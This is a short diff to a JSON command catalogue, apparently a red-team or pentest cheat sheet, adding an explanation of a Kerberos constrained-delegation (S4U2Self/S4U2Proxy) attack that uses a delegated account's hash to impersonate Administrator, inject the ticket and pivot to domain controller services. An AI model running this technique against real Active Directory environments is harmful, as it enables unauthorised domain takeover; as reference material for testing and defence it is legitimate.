@@ -114,5 +114,6 @@
       "label": "Purge tickets and retry if connection fails",
       "command": "klist purge"
     }
-  ]
+  ],
+  "explain": "Abuses constrained delegation (msDS-AllowedToDelegateTo) to impersonate Administrator to an allowed service:\n  s4u                       run S4U2Self + S4U2Proxy\n  /user:<delegate_user> /rc4:<ntlm_hash>   the delegated account and its hash\n  /impersonateuser:Administrator   the user to impersonate\n  /msdsspn:\"http/<dc_hostname>\"   the service it may delegate to\n  /dc:<dc_fqdn> /ptt        the DC to ask, and inject the ticket\nThe injected ticket lets you Enter-PSSession to the DC as Administrator; /altservice pivots http to ldap/cifs/host."
 }
